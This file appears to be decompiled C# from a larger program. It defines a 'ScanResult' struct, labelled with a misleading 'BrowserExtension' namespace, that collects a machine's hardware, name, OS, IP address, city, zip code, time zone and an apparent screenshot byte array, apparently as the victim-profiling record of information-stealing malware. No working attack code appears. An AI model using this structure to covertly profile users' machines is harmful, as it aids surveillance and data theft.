using System;
using System.Runtime.Serialization;

// Token: 0x02000060 RID: 96
[DataContract(Name = "ScanResult", Namespace = "BrowserExtension")]
public struct ScanResult
{
	// Token: 0x17000054 RID: 84
	// (get) Token: 0x06000227 RID: 551 RVA: 0x000041AD File Offset: 0x000023AD
	// (set) Token: 0x06000228 RID: 552 RVA: 0x000041B5 File Offset: 0x000023B5
	[DataMember(Name = "Hardware")]
	public string Hardware { get; set; }

	// Token: 0x17000055 RID: 85
	// (get) Token: 0x06000229 RID: 553 RVA: 0x000041BE File Offset: 0x000023BE
	// (set) Token: 0x0600022A RID: 554 RVA: 0x000041C6 File Offset: 0x000023C6
	[DataMember(Name = "ReleaseID")]
	public string ReleaseID { get; set; }

	// Token: 0x17000056 RID: 86
	// (get) Token: 0x0600022B RID: 555 RVA: 0x000041CF File Offset: 0x000023CF
	// (set) Token: 0x0600022C RID: 556 RVA: 0x000041D7 File Offset: 0x000023D7
	[DataMember(Name = "MachineName")]
	public string MachineName { get; set; }

	// Token: 0x17000057 RID: 87
	// (get) Token: 0x0600022D RID: 557 RVA: 0x000041E0 File Offset: 0x000023E0
	// (set) Token: 0x0600022E RID: 558 RVA: 0x000041E8 File Offset: 0x000023E8
	[DataMember(Name = "OSVersion")]
	public string OSVersion { get; set; }

	// Token: 0x17000058 RID: 88
	// (get) Token: 0x0600022F RID: 559 RVA: 0x000041F1 File Offset: 0x000023F1
	// (set) Token: 0x06000230 RID: 560 RVA: 0x000041F9 File Offset: 0x000023F9
	[DataMember(Name = "Language")]
	public string Language { get; set; }

	// Token: 0x17000059 RID: 89
	// (get) Token: 0x06000231 RID: 561 RVA: 0x00004202 File Offset: 0x00002402
	// (set) Token: 0x06000232 RID: 562 RVA: 0x0000420A File Offset: 0x0000240A
	[DataMember(Name = "ScreenSize")]
	public string Resolution { get; set; }

	// Token: 0x1700005A RID: 90
	// (get) Token: 0x06000233 RID: 563 RVA: 0x00004213 File Offset: 0x00002413
	// (set) Token: 0x06000234 RID: 564 RVA: 0x0000421B File Offset: 0x0000241B
	[DataMember(Name = "ScanDetails")]
	public ScanDetails ScanDetails { get; set; }

	// Token: 0x1700005B RID: 91
	// (get) Token: 0x06000235 RID: 565 RVA: 0x00004224 File Offset: 0x00002424
	// (set) Token: 0x06000236 RID: 566 RVA: 0x0000422C File Offset: 0x0000242C
	[DataMember(Name = "Country")]
	public string Country { get; set; }

	// Token: 0x1700005C RID: 92
	// (get) Token: 0x06000237 RID: 567 RVA: 0x00004235 File Offset: 0x00002435
	// (set) Token: 0x06000238 RID: 568 RVA: 0x0000423D File Offset: 0x0000243D
	[DataMember(Name = "City")]
	public string City { get; set; }

	// Token: 0x1700005D RID: 93
	// (get) Token: 0x06000239 RID: 569 RVA: 0x00004246 File Offset: 0x00002446
	// (set) Token: 0x0600023A RID: 570 RVA: 0x0000424E File Offset: 0x0000244E
	[DataMember(Name = "TimeZone")]
	public string TZ { get; set; }

	// Token: 0x1700005E RID: 94
	// (get) Token: 0x0600023B RID: 571 RVA: 0x00004257 File Offset: 0x00002457
	// (set) Token: 0x0600023C RID: 572 RVA: 0x0000425F File Offset: 0x0000245F
	[DataMember(Name = "IPv4")]
	public string IPv4 { get; set; }

	// Token: 0x1700005F RID: 95
	// (get) Token: 0x0600023D RID: 573 RVA: 0x00004268 File Offset: 0x00002468
	// (set) Token: 0x0600023E RID: 574 RVA: 0x00004270 File Offset: 0x00002470
	[DataMember(Name = "Monitor")]
	public byte[] Monitor { get; set; }

	// Token: 0x17000060 RID: 96
	// (get) Token: 0x0600023F RID: 575 RVA: 0x00004279 File Offset: 0x00002479
	// (set) Token: 0x06000240 RID: 576 RVA: 0x00004281 File Offset: 0x00002481
	[DataMember(Name = "ZipCode")]
	public string ZipCode { get; set; }

	// Token: 0x17000061 RID: 97
	// (get) Token: 0x06000241 RID: 577 RVA: 0x0000428A File Offset: 0x0000248A
	// (set) Token: 0x06000242 RID: 578 RVA: 0x00004292 File Offset: 0x00002492
	[DataMember(Name = "FileLocation")]
	public string FileLocation { get; set; }

	// Token: 0x17000062 RID: 98
	// (get) Token: 0x06000243 RID: 579 RVA: 0x0000429B File Offset: 0x0000249B
	// (set) Token: 0x06000244 RID: 580 RVA: 0x000042A3 File Offset: 0x000024A3
	[DataMember(Name = "SeenBefore")]
	public bool SeenBefore { get; set; }
}
